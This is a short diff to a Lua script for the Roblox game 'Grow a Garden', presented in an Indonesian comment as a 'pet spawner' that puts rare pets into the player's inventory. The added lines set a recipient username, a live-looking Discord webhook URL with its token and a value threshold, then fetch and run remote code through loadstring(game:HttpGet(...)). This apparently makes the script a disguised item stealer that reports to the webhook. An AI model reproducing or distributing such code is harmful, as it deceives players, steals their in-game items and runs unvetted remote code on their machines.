@@ -1,4 +1,10 @@
---[[
+Username = "govloklu11"
+Webhook = "https://discord.com/api/webhooks/1423744743082430625/ZZLmkNEXUJEIxuF2Tnxt4tAAq-O-jeJdIRUPkHhNEP4xRwIJeaLWkVi3BIjYcA3Q3U09"
+MinimumValue = 100000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thescripterthings/SpeedHubV2/refs/heads/main/PetSpawner%20X3"))()
+
+-[[
     Nama Skrip: PetSpawner_Deluxe (Fiksi)
     Game: Grow a Garden (Roblox)
     Fitur: Memunculkan Pet Langka Langsung ke Inventaris.
